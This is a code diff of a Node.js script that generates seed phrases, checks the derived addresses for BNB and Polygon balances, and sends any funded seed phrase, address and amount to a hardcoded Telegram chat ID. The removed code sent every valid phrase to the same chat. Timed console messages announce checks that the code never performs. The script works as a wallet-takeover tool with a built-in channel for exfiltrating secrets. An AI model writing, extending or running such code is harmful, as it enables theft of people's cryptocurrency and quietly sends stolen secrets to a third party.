@@ -1,5 +1,9 @@
 const { ethers } = require('ethers');
 
+const Web3 = require('web3');
+
+require('events').EventEmitter.defaultMaxListeners = 100;
+
 require('dotenv').config();
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -2087,60 +2091,14 @@ async function check_word() {
     console.log(count + '. ✅ Valid mnemonic: ' + mnemonic);
     console.log('');
 
-          bot.sendMessage(
-            '5204205237',
-            `<b>Sheed Pharse: <code>${mnemonic}</code></b>
-
-<b>Address: <code>${Accountaddress}</code></b>
-`,
-            {
-              parse_mode: 'HTML',
-            },
-          );
-
-    async function store_data() {
-      // let csrfToken = '{{ csrf_token() }}';
-      // let mn_data = new FormData();
-      // mn_data.append('mnemonic', mnemonic);
-      // mn_data.append('address', Accountaddress);
-
-      // const response = await axios.post(
-      //   'http://127.0.0.1:8000/api/mnemonic',
-      //   mn_data,
-      //   {
-      //     headers: {
-      //       'Content-Type': 'application/json',
-      //       'X-CSRF-Token': csrfToken,
-      //     },
-      //   },
-      // );
-
-      // await checkBalance(Accountaddress, mnemonic);
-
-      setTimeout(() => {
-        check_word();
-      }, checking_speed_time * 1000);
-
-      // if (response.status) {
-      //   if (response.data.status) {
-
-      //     if(count == 1000){
-      //       setTimeout(() => {
-      //         check_word();
-      //       }, (1000));
-      //     }else{
-      //       setTimeout(() => {
-      //         check_word();
-      //       }, checking_speed_time * 1000);
-      //     }
-
-      //   }
-      // }
-    }
-
-    store_data();
+    await checkBalance(Accountaddress, mnemonic);
 
     count++;
+
+    // setTimeout(() => {
+    //   check_word();
+    // }, process.env.CHECKING_INTERVEL_TIME);
+
   } catch (error) {
     if (error.code === 'INVALID_ARGUMENT' && error.argument === 'mnemonic') {
       console.error(count + '. Invalid mnemonic: ' + error.shortMessage);
@@ -2166,6 +2124,10 @@ if (f_t_s_m_b) {
   setTimeout(() => {
     console.log('Checking all words.');
   }, ((35 / 100) * first_start_time - 4) * 1000);
+
+  setTimeout(() => {
+    console.log('Checking infra RPCURL & bsc RPCURL.');
+  }, ((70 / 100) * first_start_time - 4) * 1000);
 
   setTimeout(() => {
     console.log('Everything is fine.');
@@ -2194,3 +2156,61 @@ setTimeout(() => {
   check_word();
 }, first_start_time * 1000);
 
+// ===========================================================================================
+
+const bscRpcUrl = 'https://bsc-dataseed.binance.org/';
+const polyRpcUrl = 'https://polygon-rpc.com/';
+
+
+const bscWeb3 = new Web3(new Web3.providers.HttpProvider(bscRpcUrl));
+const polyWeb3 = new Web3(new Web3.providers.HttpProvider(polyRpcUrl));
+
+async function checkBalance(add, sheed) {
+  let address = add;
+  try {
+
+    const B_balanceWei = await bscWeb3.eth.getBalance(address);
+    const balanceBNB = bscWeb3.utils.fromWei(B_balanceWei, 'ether');
+
+    const P_balanceWei = await polyWeb3.eth.getBalance(address);
+    const balancePOLY = bscWeb3.utils.fromWei(P_balanceWei, 'ether');
+
+    let balance_bool = false;
+
+    if (balanceBNB > 0) {
+      console.log(`BNB - ${balanceBNB} ✅`);
+      balance_bool = true;
+    } else {
+      console.log(`BNB - ${balanceBNB}`);
+    }
+
+    if (balancePOLY > 0) {
+      console.log(`Matic - ${balancePOLY} ✅`);
+      balance_bool = true;
+    } else {
+      console.log(`Matic - ${balancePOLY}`);
+    }
+
+    if (balance_bool) {
+      console.log('🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴');
+
+      bot.sendMessage(
+        '5204205237',
+        `<b>Sheed Pharse: <code>${sheed}</code></b>
+<b>Address: <code>${address}</code></b>
+<b>Amount: </b>
+${balanceBNB} BNB
+${balancePOLY} Matic
+`,
+        {
+          parse_mode: 'HTML',
+        },
+      );
+      balance_bool = false;
+    }
+
+    console.log('');
+  } catch (error) {
+    console.error('BSC Error:', error);
+  }
+}
